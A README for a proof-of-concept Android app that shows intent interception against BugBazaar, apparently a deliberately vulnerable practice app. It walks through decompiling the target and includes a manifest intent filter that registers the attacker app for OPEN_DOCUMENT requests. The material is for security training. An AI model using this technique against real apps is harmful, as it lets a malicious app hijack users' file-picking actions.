# Intercepting Intents
This project can be used to create a poc for intent interception vulnerability on BugBazaar application.

### How to exploit intent interception?
1. Decompile the BugBazaar app in Jadx-gui and search for "startActivityForResult" keyword.
2. Open package com.BugBazaar.ui.MyProfile activity and you will see the code for   startActivityForResult
3. Here selectPhotoFromGallery() creates an Intent with the action android.intent.action.OPEN_DOCUMENT, which is used to open a document of any type.
4. It sets the type of the content that the user can pick to */*, indicating that any type of file can be selected.
5. Create a new project in Android Studio with Empty activity


6. Put following code in AndroidManifest.xml 
  <activity
            android:name=".MainActivity"
            android:exported="true" >
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />

                <category android:name="android.intent.category.LAUNCHER" />

                <action android:name="android.intent.action.OPEN_DOCUMENT" />
                <category android:name="android.intent.category.DEFAULT" />
                <data android:mimeType="*/*" />
            </intent-filter>
        </activity>

7. Run this application in same device where BugBazaar is installed.

8. Now open BugBazaar application and navigate to My Profile module
9. Click on profile picture and application will let user choose from applications
10. Here, our application can be seen in the list. Click on our application
11. Our application will be opened.
